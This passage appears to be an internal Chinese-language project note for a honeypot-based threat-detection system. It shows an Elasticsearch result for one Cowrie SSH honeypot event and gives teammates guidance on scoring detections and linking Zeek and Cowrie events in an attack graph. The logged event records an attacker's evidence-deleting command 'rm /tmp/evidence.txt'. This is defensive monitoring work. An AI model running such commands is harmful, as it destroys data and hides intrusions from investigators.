          "message" : "CMD: rm /tmp/evidence.txt",
          "raw" : {
            "eventid" : "cowrie.command.input",
            "input" : "rm /tmp/evidence.txt",
            "message" : "CMD: rm /tmp/evidence.txt",
            "sensor" : "19b4c34a5a8a",
            "timestamp" : "2026-01-13T20:09:58.316180Z",
            "src_ip" : "59.64.129.102",
            "session" : "7cae5878c418"
          },
          "metadata" : {
            "atlas_label" : "",
            "path_signature" : ""
          },
          "detection" : {
            "rules" : [
              "File Manipulation"
            ],
            "confidence" : 0.7,
            "severity" : "medium"
          },
          "@timestamp" : "2026-01-13T20:09:58.316180Z"
        },
        "sort" : [
          1768334998316
        ]
      }
    ]
  }
}
```

---

## 🤝 3. 数据取用指南 (给组员 3 & 4)

### 📢 给组员 3 (Context Engine / 评分引擎)

你们不再需要对原始日志进行正则匹配 (`regex`)。请直接使用以下清洗好的字段：

1. **判定威胁**：
    
    - 直接读取 `detection.confidence` (0.0 - 1.0)。
        
    - 直接读取 `detection.rules` 获取具体的违规原因（如 `"Sensitive File Access"`）。
        
2. **获取标签**：
    
    - 直接读取 `threat.technique.id` (如 `T1071`) 和 `name`。
        
3. **计算分数**：
    
    - 建议逻辑：`Score = confidence * 100`。
        
    - 对于 Cowrie 日志，凡是 `detection.confidence == 1.0` 的，建议直接标记为 **Critical Threat**。
        

### 📢 给组员 4 (Graph Builder / 溯源图谱)

为了解决“蜜罐节点与流量节点无法连接”的问题，我在所有数据源中都注入了统一的 **Host Identity**。

1. **节点 ID 生成 (Node ID Generation)**：
    
    - 请务必使用 `event.host.name` 字段作为 ID 生成的盐值 (Salt)。
        
    - **Zeek 数据**: `host.name` = `iZ2ze...` (真实宿主机名)
        
    - **Cowrie 数据**: `host.name` = `iZ2ze...` (同上)
        
    - _效果_：这能保证同一台机器上的 SSH 蜜罐日志和 Zeek 流量日志在图谱上聚类到同一个物理节点下。
        
2. **关联逻辑**：
    
    - 可以通过 `source.ip` + `timestamp` + `host.name` 将 **Zeek 网络流** 与 **Cowrie 登录/命令** 事件关联起来，还原出“外部 IP -> 连入 SSH -> 下载文件”的完整攻击路径。